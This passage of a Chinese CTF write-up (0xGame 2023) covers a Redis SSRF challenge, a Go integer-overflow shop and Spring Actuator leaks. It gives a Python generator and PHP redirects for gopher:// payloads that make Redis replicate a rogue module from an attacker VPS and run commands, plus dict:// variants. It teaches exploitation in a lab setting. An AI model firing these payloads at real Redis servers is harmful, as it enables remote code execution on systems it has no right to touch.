<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a> --工具</p>
<p>payload：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">data</span>):<br>    enc_data = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        h = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) == <span class="hljs-number">1</span>:<br>            enc_data += <span class="hljs-string">&#x27;%0&#x27;</span> + h.upper()<br>        <span class="hljs-keyword">else</span>:<br>            enc_data += <span class="hljs-string">&#x27;%&#x27;</span> + h.upper()<br>    <span class="hljs-keyword">return</span> enc_data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">payload</span>):<br><br>    redis_payload = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>        arg_num = <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(i.split(<span class="hljs-string">&#x27; &#x27;</span>)))<br>        redis_payload += arg_num + <span class="hljs-string">&#x27;\r\n&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>            arg_len = <span class="hljs-string">&#x27;$&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(j))<br>            redis_payload += arg_len + <span class="hljs-string">&#x27;\r\n&#x27;</span><br>            redis_payload += j + <span class="hljs-string">&#x27;\r\n&#x27;</span><br><br>    gopher_payload = <span class="hljs-string">&#x27;gopher://db:6379/_&#x27;</span> + urlencode(redis_payload)<br>    <span class="hljs-keyword">return</span> gopher_payload<br><br>payload1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">slaveof vps-ip 21000</span><br><span class="hljs-string">config set dir /tmp</span><br><span class="hljs-string">config set dbfilename exp.so</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>payload2 = <span class="hljs-string">&#x27;&#x27;&#x27;slaveof no one</span><br><span class="hljs-string">module load /tmp/exp.so</span><br><span class="hljs-string">system.exec &#x27;env&#x27;</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(gen_payload(payload1))<br><span class="hljs-built_in">print</span>(gen_payload(payload2))<br></code></pre></td></tr></table></figure>
<p>![image-20231104225534463](0xGame 2023/image-20231104225534463.png)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// step 1</span><br><span class="hljs-comment">//header(&#x27;Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%31%34%0D%0A%31%32%34%2E%32%32%30%2E%32%33%33%2E%32%36%0D%0A%24%35%0D%0A%36%35%35%33%34%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A&#x27;);</span><br><br><span class="hljs-comment">// step 2</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里将step1和step2分为两个php文件。</p>
<p>同时在 vps 上启动一个 php 服务器, 例如 <code>php -S 0.0.0.0:65000</code>, 然后将上述两个PHP文件上传至该php服务的根目录下，最后在题目当中去访问这两个PHP文件</p>
<p>![image-20231104225700858](0xGame 2023/image-20231104225700858.png)</p>
<p>![image-20231104225711072](0xGame 2023/image-20231104225711072.png)</p>
<p>![image-20231104225734808](0xGame 2023/image-20231104225734808.png)</p>
<p>显示如图所示的状态，同时记得开启<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server#redis-rogue-server">Redis Rogue Server</a>的监听</p>
<p>![image-20231104225828706](0xGame 2023/image-20231104225828706.png)</p>
<p>如图所示，在访问1.php之后会看到如图所示的状态，代表成功打入，记得21000端口要开放</p>
<p>之后在访问2.php之后</p>
<p>![image-20231104225922080](0xGame 2023/image-20231104225922080.png)</p>
<p>会显示上图所示的link，我们访问即可看到env环境变量中的flag</p>
<p>![image-20231104225322560](0xGame 2023/image-20231104225322560.png)</p>
<p>这里得注意几个点</p>
<p>首先 gopher 得分两次打, 不然你在执行 <code>slaveof IP Port</code> 命令之后又立即执行了 <code>slave of no one</code>, 这就导致根本没有时间去主从复制 <a target="_blank" rel="noopener" href="http://exp.so">exp.so</a></p>
<p>其次在使用 gopher 发送 redis 命令的时候记得结尾加上 <code>quit</code>, 不然会一直卡住</p>
<p>然后注意 redis 的主机名是 <code>db</code>, 而不是 <code>127.0.0.1</code>, 因此访问 redis 数据库得用 <code>db:6379</code></p>
<p>如果用 dict 协议打的话, 得调整一下 payload 顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dict://db:6379/config:set:dir:/tmp<br>dict://db:6379/config:set:dbfilename:exp.so<br>dict://db:6379/slaveof:host.docker.internal:21000<br>dict://db:6379/module:load:/tmp/exp.so<br>dict://db:6379/slave:no:one<br>dict://db:6379/system.exec:env<br>dict://db:6379/module:unload:system<br></code></pre></td></tr></table></figure>
<p>因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 <code>/data/dump.rdb</code></p>
<h2 id="Week-3-GoShop"><a href="#Week-3-GoShop" class="headerlink" title="Week-3-GoShop"></a>[Week 3] GoShop</h2>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;crypto/rand&quot;</span><br>	<span class="hljs-string">&quot;embed&quot;</span><br>	<span class="hljs-string">&quot;fmt&quot;</span><br>	<span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><br>	<span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>	<span class="hljs-string">&quot;github.com/google/uuid&quot;</span><br>	<span class="hljs-string">&quot;html/template&quot;</span><br>	<span class="hljs-string">&quot;net/http&quot;</span><br>	<span class="hljs-string">&quot;os&quot;</span><br>	<span class="hljs-string">&quot;strconv&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>	Id    <span class="hljs-type">string</span><br>	Money <span class="hljs-type">int64</span><br>	Items <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int64</span><br>&#125;<br><br><span class="hljs-keyword">type</span> Product <span class="hljs-keyword">struct</span> &#123;<br>	Name  <span class="hljs-type">string</span><br>	Price <span class="hljs-type">int64</span><br>&#125;<br><br><span class="hljs-keyword">var</span> users <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*User<br><br><span class="hljs-keyword">var</span> products []*Product<br><br><span class="hljs-comment">//go:embed public</span><br><span class="hljs-keyword">var</span> fs embed.FS<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>	users = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*User)<br>	products = []*Product&#123;<br>		&#123;Name: <span class="hljs-string">&quot;Apple&quot;</span>, Price: <span class="hljs-number">10</span>&#125;,<br>		&#123;Name: <span class="hljs-string">&quot;Banana&quot;</span>, Price: <span class="hljs-number">50</span>&#125;,<br>		&#123;Name: <span class="hljs-string">&quot;Orange&quot;</span>, Price: <span class="hljs-number">100</span>&#125;,<br>		&#123;Name: <span class="hljs-string">&quot;Flag&quot;</span>, Price: <span class="hljs-number">999999999</span>&#125;,<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IndexHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	c.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;index.html&quot;</span>, gin.H&#123;&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InfoHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	s := sessions.Default(c)<br><br>	<span class="hljs-keyword">if</span> s.Get(<span class="hljs-string">&quot;id&quot;</span>) == <span class="hljs-literal">nil</span> &#123;<br>		u := uuid.New().String()<br>		users[u] = &amp;User&#123;Id: u, Money: <span class="hljs-number">100</span>, Items: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int64</span>)&#125;<br>		s.Set(<span class="hljs-string">&quot;id&quot;</span>, u)<br>		s.Save()<br>	&#125;<br><br>	user := users[s.Get(<span class="hljs-string">&quot;id&quot;</span>).(<span class="hljs-type">string</span>)]<br>	c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>		<span class="hljs-string">&quot;user&quot;</span>: user,<br>	&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ResetHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	s := sessions.Default(c)<br>	s.Clear()<br><br>	u := uuid.New().String()<br>	users[u] = &amp;User&#123;Id: u, Money: <span class="hljs-number">100</span>, Items: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int64</span>)&#125;<br>	s.Set(<span class="hljs-string">&quot;id&quot;</span>, u)<br>	s.Save()<br><br>	c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>		<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Reset success&quot;</span>,<br>	&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BuyHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	s := sessions.Default(c)<br>	user := users[s.Get(<span class="hljs-string">&quot;id&quot;</span>).(<span class="hljs-type">string</span>)]<br><br>	data := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br>	c.ShouldBindJSON(&amp;data)<br><br>	<span class="hljs-keyword">var</span> product *Product<br><br>	<span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> products &#123;<br>		<span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;name&quot;</span>] == v.Name &#123;<br>			product = v<br>			<span class="hljs-keyword">break</span><br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> product == <span class="hljs-literal">nil</span> &#123;<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No such product&quot;</span>,<br>		&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	n, _ := strconv.Atoi(data[<span class="hljs-string">&quot;num&quot;</span>].(<span class="hljs-type">string</span>))<br><br>	<span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> &#123;<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Product num can&#x27;t be negative&quot;</span>,<br>		&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	<span class="hljs-keyword">if</span> user.Money &gt;= product.Price*<span class="hljs-type">int64</span>(n) &#123;<br>		user.Money -= product.Price * <span class="hljs-type">int64</span>(n)<br>		user.Items[product.Name] += <span class="hljs-type">int64</span>(n)<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;Buy %v * %v success&quot;</span>, product.Name, n),<br>		&#125;)<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;You don&#x27;t have enough money&quot;</span>,<br>		&#125;)<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SellHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	s := sessions.Default(c)<br>	user := users[s.Get(<span class="hljs-string">&quot;id&quot;</span>).(<span class="hljs-type">string</span>)]<br><br>	data := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br>	c.ShouldBindJSON(&amp;data)<br><br>	<span class="hljs-keyword">var</span> product *Product<br><br>	<span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> products &#123;<br>		<span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;name&quot;</span>] == v.Name &#123;<br>			product = v<br>			<span class="hljs-keyword">break</span><br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> product == <span class="hljs-literal">nil</span> &#123;<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No such product&quot;</span>,<br>		&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	count := user.Items[data[<span class="hljs-string">&quot;name&quot;</span>].(<span class="hljs-type">string</span>)]<br>	n, _ := strconv.Atoi(data[<span class="hljs-string">&quot;num&quot;</span>].(<span class="hljs-type">string</span>))<br><br>	<span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> &#123;<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Product num can&#x27;t be negative&quot;</span>,<br>		&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	<span class="hljs-keyword">if</span> count &gt;= <span class="hljs-type">int64</span>(n) &#123;<br>		user.Money += product.Price * <span class="hljs-type">int64</span>(n)<br>		user.Items[product.Name] -= <span class="hljs-type">int64</span>(n)<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;Sell %v * %v success&quot;</span>, product.Name, n),<br>		&#125;)<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;You don&#x27;t have enough product&quot;</span>,<br>		&#125;)<br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FlagHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	s := sessions.Default(c)<br>	user := users[s.Get(<span class="hljs-string">&quot;id&quot;</span>).(<span class="hljs-type">string</span>)]<br><br>	v, ok := user.Items[<span class="hljs-string">&quot;Flag&quot;</span>]<br>	<span class="hljs-keyword">if</span> !ok || v &lt;= <span class="hljs-number">0</span> &#123;<br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;You must buy &lt;code&gt;flag&lt;/code&gt; first&quot;</span>,<br>		&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	flag, _ := os.ReadFile(<span class="hljs-string">&quot;/flag&quot;</span>)<br>	c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>		<span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;Here is your flag: &lt;code&gt;%s&lt;/code&gt;&quot;</span>, <span class="hljs-type">string</span>(flag)),<br>	&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	secret := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">16</span>)<br>	rand.Read(secret)<br><br>	tpl, _ := template.ParseFS(fs, <span class="hljs-string">&quot;public/index.html&quot;</span>)<br>	store := cookie.NewStore(secret)<br><br>	r := gin.Default()<br>	r.SetHTMLTemplate(tpl)<br>	r.Use(sessions.Sessions(<span class="hljs-string">&quot;gosession&quot;</span>, store))<br><br>	r.GET(<span class="hljs-string">&quot;/&quot;</span>, IndexHandler)<br><br>	api := r.Group(<span class="hljs-string">&quot;/api&quot;</span>)<br>	&#123;<br>		api.GET(<span class="hljs-string">&quot;/info&quot;</span>, InfoHandler)<br>		api.POST(<span class="hljs-string">&quot;/buy&quot;</span>, BuyHandler)<br>		api.POST(<span class="hljs-string">&quot;/sell&quot;</span>, SellHandler)<br>		api.GET(<span class="hljs-string">&quot;/flag&quot;</span>, FlagHandler)<br>		api.GET(<span class="hljs-string">&quot;/reset&quot;</span>, ResetHandler)<br>	&#125;<br><br>	r.StaticFileFS(<span class="hljs-string">&quot;/static/main.js&quot;</span>, <span class="hljs-string">&quot;public/main.js&quot;</span>, http.FS(fs))<br>	r.StaticFileFS(<span class="hljs-string">&quot;/static/simple.css&quot;</span>, <span class="hljs-string">&quot;public/simple.css&quot;</span>, http.FS(fs))<br><br>	r.Run(<span class="hljs-string">&quot;:8000&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
<p>题目是一个商店, 初始 money 为 100, 需要购买金额为 999999999 的 flag 商品后才能拿到 flag</p>
<p>这题就是审计代码，不过我也没学过go语言，不过我看了一番猜测问题可能会出现在如下位置：</p>
<p>![image-20231105092845595](0xGame 2023/image-20231105092845595.png)</p>
<p>![image-20231105092853470](0xGame 2023/image-20231105092853470.png)</p>
<p>这里是判断用户购买金额以及数量的地方，接下来就看wp了</p>
<p>程序使用了 <code>strconv.Atoi(data[&quot;num&quot;].(string))</code> 将 json 传递的 num 字符串转换成了 int 类型的变量 n</p>
<p>后面判断用户的 money 时将其转换成了 int64 类型, 而 product.Price 本身也是 int64 类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> user.Money &gt;= product.Price*<span class="hljs-type">int64</span>(n) &#123;<br>  user.Money -= product.Price * <span class="hljs-type">int64</span>(n)<br>  user.Items[product.Name] += <span class="hljs-type">int64</span>(n)<br>  c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>    <span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;Buy %v * %v success&quot;</span>, product.Name, n),<br>  &#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>    <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;You don&#x27;t have enough money&quot;</span>,<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
<p><strong>这里先介绍一些概念</strong></p>
<p>Go 语言是强类型语言, 包含多种数据类型, 以数字类型为例, 存在 uint8 uint16 uint32 uint64 (无符号整型) 和 int8 int16 int32 int64 (有符号整型) 等类型</p>
<p>Go 语言在编译期会检查源码中定义的变量是否存在溢出, 例如 <code>var i uint8 = 99999</code> 会使得编译不通过, 但是并不会检查变量的运算过程中是否存在溢出, 例如 <code>var i uint8 = a * b</code>, 如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞</p>
<p>上面的 BuyHandler 虽然限制了 n 不能为负数, 但是并没有限制 n 的最大值</p>
<p>因此我们可以控制 n, 使得 <code>product.Price * int64(n)</code> 溢出为一个负数, 之后进行 <code>user.Money -= product.Price * int64(n)</code> 运算的时候, 当前用户的 money 就会增加, 最终达到一个可以购买 flag 商品的金额, 从而拿到 flag</p>
<p>查阅相关文档可以知道 int64 类型的范围是 <code>-9223372036854775808 ~ 9223372036854775807</code></p>
<p>经过简单的计算或者瞎猜, 可以购买数量为 <code>922337203695477808</code> 的 apple</p>
<p>![image-20231105093447613](0xGame 2023/image-20231105093447613.png)</p>
<p>点击get flag，成功拿到</p>
<p>![image-20231105093500557](0xGame 2023/image-20231105093500557.png)</p>
<h2 id="Week-4-spring"><a href="#Week-4-spring" class="headerlink" title="Week-4-spring"></a>[Week 4] spring</h2>
<p>Hint 1: Spring Actuator</p>
<p>Hint 2: 看看 /actuator/env 再看看 /actuator/heapdump</p>
<p>根据题目提示这里会有信息泄露，于是我上网搜查了一下相关信息，结合提示我们来看一下有哪些敏感信息，首先访问</p>
<h3 id="env-泄露配置信息"><a href="#env-泄露配置信息" class="headerlink" title="env-泄露配置信息"></a>env 泄露配置信息</h3>
<p>![image-20231105094132544](0xGame 2023/image-20231105094132544.png)</p>
<p>这里看到了用户名和密码，不过密码不可见，不过这里的用户名提示我们flag就在password，所以我们思路就是想办法得到密码的明文</p>
<h3 id="mappings-泄露路由信息"><a href="#mappings-泄露路由信息" class="headerlink" title="mappings-泄露路由信息"></a>mappings 泄露路由信息</h3>
<p>![image-20231105094341321](0xGame 2023/image-20231105094341321.png)</p>
<p>访问之后可以看到存在诸多路由信息，我们可以有选择的去读取</p>
<h3 id="heapdump-泄露堆栈信息"><a href="#heapdump-泄露堆栈信息" class="headerlink" title="heapdump-泄露堆栈信息"></a>heapdump 泄露堆栈信息</h3>
